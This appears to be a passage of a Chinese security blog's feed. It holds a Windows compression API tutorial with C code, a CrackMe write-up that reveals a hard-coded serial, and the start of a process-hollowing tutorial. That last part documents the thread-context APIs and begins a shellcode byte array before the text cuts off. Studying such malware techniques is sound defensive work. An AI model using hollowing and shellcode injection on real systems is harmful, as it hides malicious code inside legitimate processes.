FinalUncompressedSize<br>);<br></code></pre></div></td></tr></table></figure><p>CompressionFormat：指定压缩缓冲区中压缩格式的位掩码。该参数必须设置为COMPRESSION_FORMAT_LZNT1。它和其他相关压缩格式的含义如下：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>COMPRESSION_FORMAT_LZNT1</td><td>LZ压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS</td><td>Xpress压缩算法</td></tr></tbody></table><p>UncompressedBuffer：指向存储解压缩数据的缓冲区指针，该缓冲区从CompressedBuffer接收解压缩数据。该参数是必须的，不可以为NULL。</p><p>UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小。</p><p>CompressedBuffer：指向要解压缩的数据缓冲区的指针。该参数是必须的不可以为空。</p><p>CompressedBufferSize：指定CompressedBuffer缓冲区的大小。</p><p>FinalUncompressedSize：指向解压之后得到的数据大小的指针，该变量接收在UncompressedBuffer中存储的解压缩数据的大小。该参数是必须的，不能为NULL。</p><p>返回值：返回STATUS_SUCCESS则表示成功，否则失败。</p><h4 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">CompressData</span><span class="hljs-params">(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)</span></span>;<br><span class="hljs-function">BOOL <span class="hljs-title">DeCompressData</span><span class="hljs-params">(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI * FN_RtlGetCompressionWorkSpaceSize)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG CompressBufferWorkSpaceSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG CompressFragmentWorkSpaceSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI* FN_RtlCompressBuffer)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function"> USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function"> PUCHAR UncompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  UncompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PUCHAR CompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  CompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  UncompressedChunkSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PULONG FinalCompressedSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PVOID  WorkSpace</span></span><br><span class="hljs-params"><span class="hljs-function"> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI* FN_RtlDecompressBuffer)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">USHORT CompressionFormat,</span></span><br><span class="hljs-params"><span class="hljs-function">PUCHAR UncompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG  UncompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PUCHAR CompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG  CompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG FinalUncompressedSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>DWORD i = <span class="hljs-number">0</span>;<br>BOOL flag = FALSE;<br><span class="hljs-keyword">char</span> buffer[] = <span class="hljs-string">&quot;b1ackie&quot;</span>;<br>DWORD dwBufferLen = <span class="hljs-built_in">strlen</span>(buffer);<br>BYTE* pCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwCompreeDataLen = <span class="hljs-number">0</span>;<br>BYTE* pUnCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwUnCompressDataLen = <span class="hljs-number">0</span>;<br>CompressData((BYTE*)buffer, dwBufferLen, &amp;pCompressData, &amp;dwCompreeDataLen);<br><br>DeCompressData(pCompressData, dwCompreeDataLen, &amp;pUnCompressData, &amp;dwUnCompressDataLen);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;原始数据：\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwBufferLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, buffer[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n加密后数据：\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwCompreeDataLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, pCompressData[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n解密后数据\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwUnCompressDataLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, pUnCompressData[i]);<br>&#125;<br><span class="hljs-keyword">if</span> (pUnCompressData) <br>&#123;<br><span class="hljs-keyword">delete</span>[]pUnCompressData;<br>pUnCompressData = <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><span class="hljs-keyword">if</span> (pCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pCompressData;<br>pCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">CompressData</span><span class="hljs-params">(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>NTSTATUS status = <span class="hljs-number">0</span>;<br>DWORD dwWorkSpaceSize = <span class="hljs-number">0</span>;<br>DWORD dwFragmentWorkSpaceSize = <span class="hljs-number">0</span>;<br>BYTE* pWorkSpace = <span class="hljs-literal">NULL</span>;<br>BYTE* pCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwCompressDataLen = <span class="hljs-number">4096</span>;<br>DWORD dwFinalCompressSize = <span class="hljs-number">0</span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载NTDLL失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = <br>(FN_RtlGetCompressionWorkSpaceSize)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlGetCompressionWorkSpaceSize&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlGetCompressionWorkSpaceSize == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlGetCompressionWorkSpaceSize函数地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlCompressBuffer RtlCompressBuffer = (FN_RtlCompressBuffer)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlCompressBuffer&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlCompressBuffer == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlCompressBuffer地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//获取WORKSPACE的大小</span><br>status = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD, &amp;dwWorkSpaceSize, &amp;dwFragmentWorkSpaceSize);<br><span class="hljs-keyword">if</span> (status!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取workspace大小失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pWorkSpace = <span class="hljs-keyword">new</span> BYTE[dwWorkSpaceSize];<br><span class="hljs-keyword">if</span> (pWorkSpace == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pWorkSpace, dwWorkSpaceSize);<br><span class="hljs-keyword">while</span> (TRUE) <br>&#123;<br>pCompressData = <span class="hljs-keyword">new</span> BYTE[dwCompressDataLen];<br><span class="hljs-keyword">if</span> (pCompressData == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pCompressData, dwCompressDataLen);<br><span class="hljs-comment">//压缩数据</span><br>RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUncompressDataLen, <br>pCompressData, dwCompressDataLen, <span class="hljs-number">4096</span>, &amp;dwFinalCompressSize, (PVOID)pWorkSpace);<br><br><span class="hljs-keyword">if</span> (dwCompressDataLen &lt; dwFinalCompressSize)<br>&#123;<br><span class="hljs-keyword">if</span> (pCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pCompressData;<br>pCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>dwCompressDataLen = dwFinalCompressSize;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>*ppCompressData = pCompressData;<br>*pdwCompressDataLen = dwFinalCompressSize;<br>flag = TRUE;<br>&#125;<span class="hljs-keyword">while</span>(FALSE);<br><span class="hljs-keyword">if</span>(pWorkSpace)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pWorkSpace;<br>pWorkSpace = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (hDll)<br>&#123;<br>FreeLibrary(hDll);<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">DeCompressData</span><span class="hljs-params">(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>BYTE* pUnCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwUnCompressDataLen = <span class="hljs-number">4096</span>;<br>DWORD dwFinalUnCompressSize = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载NTDLL失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlDecompressBuffer RtlDecompressBuffer = (FN_RtlDecompressBuffer)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlDecompressBuffer&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlDecompressBuffer == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlDecompressBuffer地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br>pUnCompressData = <span class="hljs-keyword">new</span> BYTE[dwUnCompressDataLen];<br><span class="hljs-keyword">if</span> (pUnCompressData == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pUnCompressData, dwUnCompressDataLen);<br>RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUnCompressDataLen, <br>pCompressData, dwCompressDataLen, &amp;dwFinalUnCompressSize);<br><span class="hljs-keyword">if</span> (dwUnCompressDataLen &lt; dwFinalUnCompressSize) <br>&#123;<br><span class="hljs-keyword">if</span> (pUnCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pUnCompressData;<br>pUnCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>dwUnCompressDataLen = dwFinalUnCompressSize;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>*ppUnCompressData = pUnCompressData;<br>*pdwUncompressDataLen = dwFinalUnCompressSize;<br>flag = TRUE;<br><br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><span class="hljs-keyword">if</span> (hDll) &#123;<br>FreeLibrary(hDll);<br>&#125;<br><br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/1.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>压缩技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-008</title>
    <link href="/2021/08/04/160CrackMe-008/"/>
    <url>/2021/08/04/160CrackMe-008/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序直接输入一个注册码，输入错误弹出错误提示窗口。</p><p><img src="/2021/08/04/160CrackMe-008/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>无壳，是使用VB编写的的</p><p><img src="/2021/08/04/160CrackMe-008/2.png"></p><p>使用OD直接搜索错误弹窗的提示，可以直接定位一个关键跳转。</p><p><img src="/2021/08/04/160CrackMe-008/3.png"></p><p>开始分析一下，就在上面不远处，是明文比较输入与SynTaX 2oo1</p><p><img src="/2021/08/04/160CrackMe-008/4.png"></p><p>输入SynTaX 2oo1即可成功</p><p><img src="/2021/08/04/160CrackMe-008/5.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>有点简单了。。。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐藏技术-傀儡进程</title>
    <link href="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/"/>
    <url>/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h4 id="傀儡进程"><a href="#傀儡进程" class="headerlink" title="傀儡进程"></a>傀儡进程</h4><p>借着正常的软件进程或者系统进程的外壳来进行恶意的操作。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="GetThreadContext"><a href="#GetThreadContext" class="headerlink" title="GetThreadContext"></a>GetThreadContext</h5><p>检索指定线程的上下文</p><p>64位程序可以使用Wow64GetThreadContext检索WOW64线程的上下文。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">GetThreadContext</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE    hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCONTEXT lpContext</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hThread：要检索其上下文的线程的句柄。句柄必须有THREAD_GET_CONTEXT访问权限。</p><p>lpContext：指向上下文结构的指针，它接受指定线程适当的上下文。该结构中的ContextFlags成员可以指定检索线程上下文的哪些部分。上下文结构具有高度的处理器特性。</p><p>返回值：成功返回不为0，否则为0。</p><h5 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h5><p>设置指定线程的上下文。64位可以用Wow64SetThreadContext设置</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">SetThreadContext</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE        hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> CONTEXT *lpContext</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hThread：指定线程的句柄，并将设置其上下文。该句柄必须具有线程的THREAD_SET_CONTEXT权限。</p><p>lpContext：指向要在指定进程中设置上下文结构的指针。此结构中ContextFlags成员值可以指定要设置线程上下文的哪些部分。</p><p>返回值：如果设置了上下文，则返回值为非0，否则为0；</p><h5 id="ResumeThread"><a href="#ResumeThread" class="headerlink" title="ResumeThread"></a>ResumeThread</h5><p>减少线程的暂停计数。当暂停计数减到0时，恢复线程的执行。</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">DWORD ResumeThread(<br>  HANDLE hThread<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hThread：要重新启动线程的句柄。该句柄必须具有THREAD_SUSPEND_RESUME权限。</p><p>返回值：如果成功，返回值是线程先前挂起的计数，如果失败，则返回（DWORD）-1。</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">ReplacProcess</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszFilePath)</span></span>;<br><span class="hljs-keyword">char</span> data[] = &#123; <span class="hljs-number">0x55</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x15</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x50</span><br>,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB4</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB5</span><br>,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB6</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB7</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x4C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x69</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x62</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBB</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBC</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBD</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> 